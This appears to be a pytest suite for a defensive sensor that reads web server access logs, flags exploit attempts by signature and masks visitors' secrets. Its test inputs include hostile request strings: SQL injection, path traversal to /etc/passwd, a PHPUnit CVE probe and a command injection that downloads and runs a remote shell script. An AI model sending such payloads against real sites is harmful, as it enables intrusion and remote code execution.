"""Tests for site_log_sensor.py: run with pytest from the sensors directory."""

import os
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))

from site_log_sensor import Follower, RateCap, load_positions, parse_sites, save_positions, to_event  # noqa: E402

UA = '"-" "Mozilla/5.0 (X11; Linux x86_64)"'


def line(target: str, status: int = 404, ip: str = "203.0.113.9", method: str = "GET", ua: str = UA) -> str:
    return f'{ip} - - [20/Nov/2026:14:05:09 -0500] "{method} {target} HTTP/1.1" {status} 512 {ua}'


# ---- what gets sent ------------------------------------------------------

def test_an_exploit_line_becomes_a_site_event():
    event = to_event(line("/index.php?id=1%20UNION%20SELECT%201,2"), "example.com", "192.0.2.10")
    assert event["source"] == "site_http"
    assert event["src_ip"] == "203.0.113.9" and event["dst_ip"] == "192.0.2.10"
    assert event["occurred_at"] == "2026-11-20T19:05:09+00:00"   # -0500 to UTC
    assert event["raw"] == {
        "site": "example.com", "method": "GET", "path": "/index.php",
        "query": "id=1%20UNION%20SELECT%201,2", "status": 404,
        "user_agent": "Mozilla/5.0 (X11; Linux x86_64)", "referer": "", "signature": "sqli",
    }


def test_a_visitors_secret_in_the_url_is_reduced_to_its_length():
    event = to_event(line("/reset?token=s3cr3t-reset-link&next=../../etc/passwd"), "example.com", "192.0.2.10")
    assert event["raw"]["signature"] == "traversal"
    assert "s3cr3t" not in str(event)
    assert event["raw"]["query"] == "token=%5Bmasked%3A17+chars%5D&next=..%2F..%2Fetc%2Fpasswd"


@pytest.mark.parametrize("target,signature", [
    ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "cve_probe"),
    ("/cgi-bin/.%2e/.%2e/bin/sh", "cve_probe"),
    ("/static/../../../../etc/passwd", "traversal"),
    ("/?cmd=;wget%20http://x/y.sh|sh", "rce"),
])
def test_each_exploit_signature_is_sent(target, signature):
    assert to_event(line(target), "shop.example.com", "192.0.2.10")["raw"]["signature"] == signature


@pytest.mark.parametrize("target", [
    "/", "/dashboard", "/api/field/day?date=2026-11-20", "/build/assets/app.js",
    "/wp-login.php",          # a scan, not an exploit: recorded by the decoy, never banned here
    "/.env",                  # likewise (dirbust)
    "/search?q=o%27reilly",   # a quote alone isn't SQL injection
])
def test_ordinary_traffic_and_scans_are_dropped(target):
    assert to_event(line(target, status=200), "example.com", "192.0.2.10") is None


def test_a_scanner_user_agent_alone_is_dropped():
    assert to_event(line("/", ua='"-" "sqlmap/1.8"'), "example.com", "192.0.2.10") is None


@pytest.mark.parametrize("raw", [
    "",
    "garbage",
    '203.0.113.9 - - [20/Nov/2026:14:05:09 -0500] "-" 408 0 "-" "-"',
    'not-an-ip - - [20/Nov/2026:14:05:09 -0500] "GET /../../etc/passwd HTTP/1.1" 404 0 "-" "-"',
])
def test_odd_lines_are_skipped(raw):
    assert to_event(raw, "example.com", "192.0.2.10") is None


def test_an_escaped_quote_in_the_request_line_still_parses():
    raw = '203.0.113.9 - - [20/Nov/2026:14:05:09 +0000] "GET /?q=\\"%20or%201=1-- HTTP/1.1" 404 0 "-" "x"'
    assert to_event(raw, "example.com", "192.0.2.10")["raw"]["signature"] == "sqli"


def test_site_logs_config():
    assert parse_sites("a.com=/var/log/a.log  b.net=/var/log/b.log") == [("a.com", "/var/log/a.log"), ("b.net", "/var/log/b.log")]
    assert parse_sites("") == []
    # One site's http and https logs share its name.
    assert parse_sites("a.com=/var/log/a.log a.com=/var/log/a-ssl.log") == [("a.com", "/var/log/a.log"), ("a.com", "/var/log/a-ssl.log")]
    for bad in ("a.com", "a.com=relative.log", "a b=/x", "bad/name=/x", "a.com=/x b.net=/x"):
        with pytest.raises(ValueError):
            parse_sites(bad)


# ---- following the files -------------------------------------------------

def write(path: Path, text: str) -> None:
    with open(path, "a") as f:
        f.write(text)


def test_a_new_file_starts_at_its_end(tmp_path):
    log = tmp_path / "access.log"
    write(log, "old 1\nold 2\n")
    follower = Follower(str(log))
    assert follower.poll() == []
    write(log, "new 1\n")
    assert follower.poll() == ["new 1"]


def test_a_partial_line_waits_for_its_end(tmp_path):
    log = tmp_path / "access.log"
    log.write_text("")
    follower = Follower(str(log))
    write(log, "half")
    assert follower.poll() == []
    assert follower.position["offset"] == 0      # a restart would re-read it whole
    write(log, " done\n")
    assert follower.poll() == ["half done"]


def test_rotation_reads_the_old_file_to_its_end_then_the_new_one(tmp_path):
    log = tmp_path / "access.log"
    log.write_text("")
    follower = Follower(str(log))
    write(log, "a\n")
    assert follower.poll() == ["a"]
    write(log, "b\n")                       # written just before the rotation
    os.rename(log, tmp_path / "access.log.1")
    assert follower.poll() == ["b"]         # mid-rotation: no new file yet
    write(log, "c\n")
    assert follower.poll() == ["c"]


def test_copytruncate_starts_again_from_the_top(tmp_path):
    log = tmp_path / "access.log"
    log.write_text("")
    follower = Follower(str(log))
    write(log, "a\nb\n")
    assert follower.poll() == ["a", "b"]
    with open(log, "w") as f:
        f.write("c\n")                      # truncated in place, then written
    assert follower.poll() == ["c"]


def test_a_file_created_after_start_is_read_from_its_start(tmp_path):
    log = tmp_path / "access.log"
    follower = Follower(str(log))
    assert follower.poll() == []
    write(log, "first\n")
    assert follower.poll() == ["first"]


def test_a_restart_resumes_at_the_saved_position(tmp_path):
    log, state = tmp_path / "access.log", tmp_path / "positions.json"
    log.write_text("")
    follower = Follower(str(log))
    write(log, "a\n")
    follower.poll()
    save_positions(state, {str(log): follower.position})
    write(log, "b\nc\n")                    # written while the sensor was stopped

    again = Follower(str(log), load_positions(state)[str(log)])
    assert again.poll() == ["b", "c"]


def test_a_restart_after_a_rotation_finishes_the_rotated_file(tmp_path):
    log = tmp_path / "access.log"
    log.write_text("")
    follower = Follower(str(log))
    write(log, "a\n")
    follower.poll()
    saved = follower.position
    write(log, "b\n")                       # then, while stopped: rotated and written
    os.rename(log, tmp_path / "access.log.1")
    write(log, "c\n")

    again = Follower(str(log), saved)
    assert again.poll() == ["b", "c"]


def test_positions_survive_a_missing_or_broken_file(tmp_path):
    assert load_positions(tmp_path / "missing.json") == {}
    (tmp_path / "broken.json").write_text("{not json")
    assert load_positions(tmp_path / "broken.json") == {}


# ---- the per-address cap -------------------------------------------------

def test_one_address_is_capped_per_minute():
    cap = RateCap(3)
    assert [cap.allow("203.0.113.9", now=60.0) for _ in range(5)] == [True, True, True, False, False]
    assert cap.allow("198.51.100.4", now=60.0)            # others are unaffected
    assert cap.allow("203.0.113.9", now=120.0)            # a new minute starts afresh


def test_a_real_sites_hit_from_another_sites_page_is_marked_cross_site():
    planted = '"https://forum.example/thread/9" "Mozilla/5.0 (X11; Linux x86_64)"'
    own = '"https://www.example.com/shop" "Mozilla/5.0 (X11; Linux x86_64)"'

    assert to_event(line("/?q=../../etc/passwd", ua=planted), "example.com", "192.0.2.10")["raw"]["cross_site"] is True
    assert "cross_site" not in to_event(line("/?q=../../etc/passwd", ua=own), "example.com", "192.0.2.10")["raw"]
    assert "cross_site" not in to_event(line("/?q=../../etc/passwd"), "example.com", "192.0.2.10")["raw"]
    # A site named by a label, not its domain, can't be compared: it bans as before.
    assert "cross_site" not in to_event(line("/?q=../../etc/passwd", ua=planted), "shop", "192.0.2.10")["raw"]
